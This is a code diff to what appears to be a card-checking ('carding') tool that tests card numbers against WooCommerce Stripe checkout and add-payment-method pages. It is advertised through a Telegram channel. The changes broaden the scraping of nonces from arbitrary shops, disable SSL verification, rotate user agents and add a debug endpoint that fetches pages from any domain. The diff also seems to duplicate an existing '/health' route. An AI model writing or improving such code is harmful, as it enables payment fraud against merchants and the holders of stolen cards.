@@ -10,6 +10,10 @@ import os
 import logging
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 #Join : t.me/GatewayMaker
 logging.basicConfig(level=logging.DEBUG)
@@ -978,23 +982,50 @@ def get_stripe_key(domain):
 def extract_nonce_from_page(html_content, domain):
     logger.debug(f"Extracting nonce from {domain}")
     patterns = [
-        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
+        # WooCommerce Stripe patterns
+        r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
         r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
+        
+        # Standard WordPress nonce patterns
         r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
+        r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']',
         r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
         r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
-        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
-        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
-        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
+        
+        # Data attributes
+        r'data-nonce=["\']([^"\']+)["\']',
+        r'data-_nonce=["\']([^"\']+)["\']',
+        r'data-security=["\']([^"\']+)["\']',
+        
+        # JavaScript variable patterns
+        r'var\s+wc_stripe_params\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
+        r'var\s+stripe_params\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
+        r'var\s+wc_checkout_params\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
+        
+        # Generic nonce patterns (more flexible)
+        r'nonce["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']',
+        r'"nonce"\s*:\s*"([a-zA-Z0-9]+)"',
+        r"'nonce'\s*:\s*'([a-zA-Z0-9]+)'",
+        
+        # REST API nonce header patterns
+        r'X-WP-Nonce["\']?\s*:\s*["\']([^"\']+)["\']',
     ]
     
-    for pattern in patterns:
-        match = re.search(pattern, html_content)
-        if match:
-            logger.debug(f"Found nonce: {match.group(1)}")
-            return match.group(1)
+    for i, pattern in enumerate(patterns):
+        try:
+            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
+            if match:
+                nonce = match.group(1).strip()
+                # Validate nonce is not empty and reasonable length
+                if nonce and len(nonce) > 5 and len(nonce) < 256:
+                    logger.debug(f"Found nonce using pattern {i}: {nonce[:20]}...")
+                    return nonce
+        except Exception as e:
+            logger.error(f"Error with pattern {i}: {e}")
+            continue
     
-    logger.debug("No nonce found")
+    # Log first 500 chars of HTML for debugging
+    logger.debug(f"No nonce found. HTML preview: {html_content[:500]}")
     return None
 
 def generate_random_credentials():
@@ -1084,24 +1115,44 @@ def process_card_enhanced(domain, ccx, use_registration=True):
     payment_urls = [
         f"https://{domain}/my-account/add-payment-method/",
         f"https://{domain}/checkout/",
-        f"https://{domain}/my-account/"
+        f"https://{domain}/my-account/",
+        f"https://{domain}/wp-admin/admin-ajax.php",
+        f"https://{domain}/"
     ]
     
     nonce = None
+    html_content = ""
     for url in payment_urls:
         try:
             logger.debug(f"Trying to get nonce from: {url}")
-            response = session.get(url, timeout=10, verify=False)
+            response = session.get(
+                url, 
+                timeout=10, 
+                verify=False,
+                allow_redirects=True,
+                headers={
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5'
+                }
+            )
             if response.status_code == 200:
-                nonce = extract_nonce_from_page(response.text, domain)
+                html_content = response.text
+                nonce = extract_nonce_from_page(html_content, domain)
                 if nonce:
+                    logger.debug(f"Successfully extracted nonce from {url}")
                     break
+        except requests.exceptions.Timeout:
+            logger.error(f"Timeout getting nonce from {url}")
+            continue
+        except requests.exceptions.ConnectionError:
+            logger.error(f"Connection error getting nonce from {url}")
+            continue
         except Exception as e:
             logger.error(f"Error getting nonce from {url}: {e}")
             continue
     
     if not nonce:
-        logger.error("Failed to extract nonce from site")
+        logger.error(f"Failed to extract nonce from site. HTML length: {len(html_content) if html_content else 0}")
         return {"Response": "Failed to extract nonce from site", "Status": "Declined"}
 
     payment_data = {
@@ -1315,6 +1366,63 @@ def bulk_process_request():
     except Exception as e:
         logger.error(f"Bulk request error: {e}")
         return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500
+
+
+@app.route('/health')
+def health_check():
+    return jsonify({"status": "healthy"}), 200
+
+
+@app.route('/debug/nonce')
+def debug_nonce():
+    """Debug endpoint to test nonce extraction from a domain"""
+    domain = request.args.get('domain')
+    
+    if not domain:
+        return jsonify({"error": "Missing domain parameter"}), 400
+    
+    # Clean domain
+    if domain.startswith('https://'):
+        domain = domain[8:]
+    elif domain.startswith('http://'):
+        domain = domain[7:]
+    
+    results = {
+        "domain": domain,
+        "attempts": []
+    }
+    
+    urls = [
+        f"https://{domain}/my-account/add-payment-method/",
+        f"https://{domain}/checkout/",
+        f"https://{domain}/my-account/",
+    ]
+    
+    user_agent = UserAgent().random
+    session = requests.Session()
+    session.headers.update({'User-Agent': user_agent})
+    
+    for url in urls:
+        try:
+            response = session.get(url, timeout=10, verify=False, allow_redirects=True)
+            nonce = extract_nonce_from_page(response.text, domain)
+            
+            attempt = {
+                "url": url,
+                "status_code": response.status_code,
+                "nonce_found": nonce is not None,
+                "nonce": nonce,
+                "html_length": len(response.text),
+                "html_preview": response.text[:300] if response.text else None
+            }
+            results["attempts"].append(attempt)
+        except Exception as e:
+            results["attempts"].append({
+                "url": url,
+                "error": str(e)
+            })
+    
+    return jsonify(results)
 
 
 @app.route('/health')
